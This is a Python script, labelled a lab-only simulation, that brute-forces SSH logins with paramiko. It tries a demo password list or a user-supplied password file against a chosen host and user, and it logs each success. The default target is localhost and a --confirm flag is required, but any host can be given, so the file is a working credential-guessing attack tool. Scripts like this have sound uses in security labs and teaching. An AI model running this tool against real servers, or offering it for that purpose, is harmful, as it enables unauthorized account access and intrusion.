#!/usr/bin/env python3
"""
SSH brute-force simulation (lab-only).
Uses a small built-in list by default; accepts file with passwords.
"""
import argparse
import time
import paramiko
from utils.logger import setup_logger

def brute_force_ssh(ip="127.0.0.1", port=22, username="testuser", passwords=None):
    logger = setup_logger("brute_force_ssh")
    logger.info(f"Starting SSH brute-force simulation on {ip}:{port} as user '{username}'")

    if passwords is None:
        passwords = ["1234", "password", "test123", "admin"]  # small demo list

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for pwd in passwords:
        try:
            logger.info(f"Trying password: {pwd}")
            client.connect(ip, port=port, username=username, password=pwd, timeout=3)
            logger.info(f"[+] SUCCESS: {username}@{ip} with password '{pwd}'")
            client.close()
            return
        except paramiko.AuthenticationException:
            logger.warning(f"[-] Failed: {username}:{pwd}")
        except Exception as e:
            logger.error(f"[!] Error: {e}")
        finally:
            try:
                client.close()
            except:
                pass
        time.sleep(0.2)

    logger.info("Brute-force simulation finished. No password matched.")

def main():
    parser = argparse.ArgumentParser(description="SSH brute-force simulation (lab-only)")
    parser.add_argument("--host", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--user", default="testuser", help="Username (default: testuser)")
    parser.add_argument("--passwords", help="Path to password list (optional)")
    parser.add_argument("--confirm", action="store_true", help="Confirm you run this in a lab environment")
    args = parser.parse_args()

    if not args.confirm:
        print("[!] This script attempts SSH logins. Re-run with --confirm to proceed (lab-only).")
        return

    passwords = None
    if args.passwords:
        try:
            with open(args.passwords, "r") as f:
                passwords = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            print(f"[!] Password file not found: {args.passwords}")
            return

    brute_force_ssh(ip=args.host, port=22, username=args.user, passwords=passwords)

if __name__ == "__main__":
    main()
